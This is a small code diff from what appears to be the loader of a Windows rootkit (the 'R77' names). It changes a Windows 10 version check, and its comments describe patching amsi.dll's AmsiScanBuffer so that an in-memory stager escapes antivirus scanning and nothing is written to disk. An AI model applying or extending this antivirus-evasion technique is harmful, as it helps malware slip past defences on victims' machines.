@@ -63,8 +63,8 @@ LPWSTR GetPowershellCommand(BOOL is64Bit)
 	// [Reflection.Assembly]::Load triggers AMSI and the byte[] with Stager.exe is passed to AV for analysis.
 	// AMSI must be disabled for the entire process, because both powershell and .NET itself implement AMSI.
 
-	// AMSI is only supported on Windows 10.
-	if (R77_IsWindows10OrGreater())
+	// AMSI is only supported on Windows 10; AMSI bypass not required for Windows 7.
+	if (IsAtLeastWindows10())
 	{
 		// Patch amsi.dll!AmsiScanBuffer prior to [Reflection.Assembly]::Load.
 		// Do not use Add-Type, because it will invoke csc.exe and compile a C# DLL to disk.
